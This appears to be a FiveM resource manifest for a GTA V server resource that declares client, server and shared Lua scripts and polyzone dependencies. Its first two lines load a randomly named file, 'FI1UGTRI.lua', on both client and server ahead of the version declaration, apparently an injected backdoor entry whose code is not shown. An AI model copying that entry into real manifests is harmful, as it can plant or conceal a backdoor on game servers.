server_script "FI1UGTRI.lua"
client_script "FI1UGTRI.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	'@sandbox-polyzone/client.lua',
	'@sandbox-polyzone/BoxZone.lua',
	'@sandbox-polyzone/EntityZone.lua',
	"shared/**/*.lua",
	"client/**/*.lua",
})

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})
